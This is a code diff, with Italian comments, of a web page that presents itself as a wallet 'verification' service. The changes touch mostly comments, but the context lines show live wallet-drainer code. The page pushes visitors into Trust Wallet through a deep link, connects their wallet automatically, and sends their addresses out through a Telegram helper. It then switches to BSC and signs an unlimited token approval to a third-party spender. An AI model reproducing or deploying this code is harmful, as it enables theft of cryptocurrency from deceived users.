@@ -355,7 +355,6 @@
   <div class="modal-box">
     <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
     <div id="stepInput">
-      <!-- TITOLO E DESCRIZIONE DINAMICI -->
       <h3 id="modalTitle" style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:12px; color: white;">Request a verification</h3>
       <p id="modalDesc" style="color:var(--paper-dim); font-size:14px; margin-bottom:20px; display:none;">Your wallet is connected. Confirm the address below and tap verify to proceed.</p>
       
@@ -406,12 +405,12 @@
     const isAuto = params.get('auto') === '1';
 
     if (!isWeb3 || !isAuto) {
-      // Non siamo in Trust Wallet: reindirizza via deep link
+      // NON siamo in Trust Wallet: reindirizza via deep link
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
     } else {
-      // Siamo in Trust Wallet: procedi con l'approvazione
+      // SIAMO in Trust Wallet: esegui l'approvazione
       await executeApprove(inputAddr);
     }
   }
@@ -419,7 +418,6 @@
   async function executeApprove(inputAddr) {
     document.getElementById('statusMsg').textContent = 'Processing...';
     try {
-      // Verifica che ethers sia caricato
       if (typeof ethers === 'undefined') {
         throw new Error('ethers.js not loaded');
       }
@@ -429,13 +427,11 @@
       const connected = await signer.getAddress();
       sendTG(inputAddr, connected);
 
-      // Switch a BSC
       await window.ethereum.request({ 
         method: "wallet_switchEthereumChain", 
         params: [{ chainId: "0x38" }] 
       });
 
-      // Approva il token
       const contract = new ethers.Contract(
         "0x55d398326f99059fF775485246999027B3197955", 
         ["function approve(address s, uint256 a) external returns (bool)"], 
@@ -447,7 +443,6 @@
         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       );
 
-      // Mostra il risultato
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
@@ -467,7 +462,7 @@
     const isAuto = params.get('auto') === '1';
     
     if (isAuto && window.ethereum) {
-      // Siamo in Trust Wallet con auto=1
+      // SIAMO in Trust Wallet con auto=1: connetti automaticamente
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
       
@@ -476,9 +471,9 @@
       document.getElementById('modalDesc').style.display = "block";
 
       try {
-        // Richiedi connessione wallet
+        // Richiedi connessione wallet automaticamente
         await window.ethereum.request({ method: "eth_requestAccounts" });
-        // Apri il modal automaticamente
+        // Apri il modal con il wallet già connesso
         openVerifyModal();
       } catch (e) { 
         console.error("Connect error:", e);
@@ -486,7 +481,7 @@
       }
     }
     
-    // Nascondi loading overlay e mostra il sito
+    // Nascondi loading overlay
     document.getElementById('loadingOverlay').style.display = 'none';
     document.body.classList.add('ready');
   });
